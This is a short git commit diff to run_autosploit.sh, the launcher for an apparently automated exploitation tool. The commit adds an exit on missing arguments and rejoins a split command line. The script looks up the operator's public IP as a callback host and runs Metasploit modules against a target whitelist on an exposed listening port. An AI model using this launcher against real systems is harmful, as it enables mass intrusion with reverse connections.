1790c151901f3e38ed1644a639c68fe6cf348d6b
selora <selora@selora.com>
2018-04-09 13:12:19 -0400

    Fixed bash script args (2)

--- run_autosploit.sh
+++ run_autosploit.sh
@@ -4,6 +4,7 @@
 if [[ $# -lt 2 ]]; then
     echo "Syntax:"
     echo -e "\t./run_autosploit.sh <whitelist.txt> <exposed_lport>"
+	exit 1
 fi
 
 WHITELIST=$1
@@ -12,5 +13,4 @@ LPORT=$2
 LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
 TIMESTAMP=`date +%s`
 
-python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}"
-$LHOST $LPORT -f etc/json/default_modules.json
+python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/default_modules.json
